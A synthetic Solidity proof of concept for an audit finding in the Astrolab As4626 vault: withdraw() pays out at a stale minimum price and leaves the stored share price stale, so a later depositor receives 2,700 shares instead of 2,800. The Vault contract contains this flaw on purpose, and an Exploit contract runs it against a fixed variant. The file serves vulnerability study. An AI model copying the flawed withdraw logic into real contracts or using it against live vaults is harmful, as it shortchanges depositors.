// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Astrolab As4626 — withdraw() at the worst request price leaves last.sharePrice stale
    (Pashov Audit Group, H-04, January 2024).
    SYNTHETIC, cheatcode-free. Prices are stored in 1/12 asset units so the report's
    5, 10, 11.25 and 35/3 are the integers 60, 120, 135 and 140.
    Share counts are the report's example times 100.
    A 378,000-unit deposit (315 report-assets) mints 2,700 shares instead of 2,800. */

library AsMaths {
    function min(uint256 x, uint256 y) internal pure returns (uint256) {
        return x < y ? x : y;
    }

    function mulDiv(uint256 x, uint256 y, uint256 denominator) internal pure returns (uint256) {
        return (x * y) / denominator;
    }
}

contract Asset {
    mapping(address => uint256) internal _balances;
    mapping(address => mapping(address => uint256)) internal _allowance;

    function balanceOf(address account) external view returns (uint256) {
        return _balances[account];
    }

    function mint(address to, uint256 amount) external {
        _balances[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        _allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _balances[msg.sender] -= amount;
        _balances[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        _allowance[from][msg.sender] -= amount;
        _balances[from] -= amount;
        _balances[to] += amount;
        return true;
    }
}

contract Vault {
    using AsMaths for uint256;

    uint256 internal constant weiPerShare = 1;
    uint256 internal constant weiPerAsset = 1;

    struct Epoch {
        uint256 sharePrice;
    }

    struct Request {
        uint256 shares;
        uint256 sharePrice;
        uint256 timestamp;
    }

    Asset public asset;
    bool public fairUpdate;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    Epoch public last;
    uint256 public totalRedemption;
    uint256 public totalClaimableRedemption;
    mapping(address => Request) internal requests;

    uint256 private locked = 1;
    modifier nonReentrant() {
        require(locked == 1, "reentrancy");
        locked = 2;
        _;
        locked = 1;
    }

    constructor(Asset _asset, bool _fairUpdate) {
        asset = _asset;
        fairUpdate = _fairUpdate;
    }

    function totalAssets() public view returns (uint256) {
        return asset.balanceOf(address(this));
    }

    function totalAccountedAssets() public view returns (uint256) {
        return totalAssets() - totalClaimableRedemption.mulDiv(last.sharePrice * weiPerAsset, weiPerShare ** 2);
    }

    function totalAccountedSupply() public view returns (uint256) {
        return totalSupply - totalClaimableRedemption;
    }

    function sharePrice() public view returns (uint256) {
        uint256 supply = totalAccountedSupply();
        return supply == 0 ? weiPerShare : totalAccountedAssets().mulDiv(weiPerShare ** 2, supply * weiPerAsset);
    }

    function convertToShares(uint256 _assets) public view returns (uint256) {
        return _assets.mulDiv(weiPerShare ** 2, sharePrice() * weiPerAsset);
    }

    function _mint(address to, uint256 shares) internal {
        totalSupply += shares;
        balanceOf[to] += shares;
    }

    function seed(address lp, address alice, address bob) external {
        asset.mint(address(this), 600_000);
        _mint(lp, 6_000);
        _mint(alice, 2_000);
        _mint(bob, 2_000);
        last.sharePrice = 60;
    }

    function requestRedeem(uint256 shares) external {
        Request storage request = requests[msg.sender];
        last.sharePrice = sharePrice();
        request.sharePrice = last.sharePrice;
        request.shares = shares;
        request.timestamp = block.timestamp;
        totalRedemption += shares;
    }

    function realizeYield() external {
        asset.mint(address(this), 600_000);
    }

    function syncPrice() external {
        last.sharePrice = sharePrice();
    }

    function realizeClaims() external {
        totalClaimableRedemption = totalRedemption;
    }

    function maxRedemptionClaim(address owner) public view returns (uint256) {
        Request memory request = requests[owner];
        if (block.timestamp < request.timestamp) return 0;
        uint256 shares = request.shares;
        uint256 cap = totalClaimableRedemption;
        return shares < cap ? shares : cap;
    }

    function withdraw(uint256 shares) external nonReentrant returns (uint256 assetsOut) {
        Request storage request = requests[msg.sender];
        uint256 claimable = maxRedemptionClaim(msg.sender);
        last.sharePrice = sharePrice();

        // @> VULN: worst of last.sharePrice and the stale request price. Assets leave cheaper than sharePrice, and last.sharePrice is not rewritten.
        uint256 worst = AsMaths.min(last.sharePrice, request.sharePrice);
        uint256 price = claimable >= shares ? worst : last.sharePrice;

        assetsOut = shares.mulDiv(price * weiPerAsset, weiPerShare ** 2);
        balanceOf[msg.sender] -= shares;
        totalSupply -= shares;
        if (claimable >= shares) {
            request.shares -= shares;
            totalRedemption -= shares;
            totalClaimableRedemption -= shares;
        }
        asset.transfer(msg.sender, assetsOut);

        if (fairUpdate) {
            last.sharePrice = totalAssets().mulDiv(weiPerShare ** 2, totalSupply * weiPerAsset);
        }
    }

    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        shares = convertToShares(assets);
        asset.transferFrom(msg.sender, address(this), assets);
        _mint(receiver, shares);
    }
}

contract Holder {
    function request(Vault vault, uint256 shares) external {
        vault.requestRedeem(shares);
    }

    function withdraw(Vault vault, uint256 shares) external {
        vault.withdraw(shares);
    }
}

contract Exploit {
    uint256 public constant DEPOSIT = 378_000;
    uint256 public constant WRONG = 2_700;
    uint256 public constant FAIR = 2_800;

    Asset public asset; // nonce 1
    Vault public vault; // nonce 2
    Vault public fixedVault; // nonce 3
    Holder public lp; // nonce 4
    Holder public alice; // nonce 5
    Holder public bob; // nonce 6

    uint256 public wrongShares;
    uint256 public fairShares;
    uint256 public distortedPrice;
    uint256 public fairPrice;

    constructor() {
        asset = new Asset();
        vault = new Vault(asset, false);
        fixedVault = new Vault(asset, true);
        lp = new Holder();
        alice = new Holder();
        bob = new Holder();
    }

    function _prepare(Vault v) internal {
        v.seed(address(lp), address(alice), address(bob));
        alice.request(v, 2_000);
        bob.request(v, 2_000);
        v.realizeYield();
        v.syncPrice();
        v.realizeClaims();
        alice.withdraw(v, 2_000);
    }

    function run() external {
        _prepare(vault);
        distortedPrice = vault.sharePrice();
        asset.mint(address(this), DEPOSIT);
        asset.approve(address(vault), DEPOSIT);
        wrongShares = vault.deposit(DEPOSIT, msg.sender);

        _prepare(fixedVault);
        fairPrice = fixedVault.sharePrice();
        asset.mint(address(this), DEPOSIT);
        asset.approve(address(fixedVault), DEPOSIT);
        fairShares = fixedVault.deposit(DEPOSIT, address(this));

        require(distortedPrice == 140, "distorted price");
        require(fairPrice == 135, "fair price");
        require(wrongShares == WRONG, "wrong shares");
        require(fairShares == FAIR, "fair shares");
        require(wrongShares < fairShares, "depositor was not shorted");
    }
}
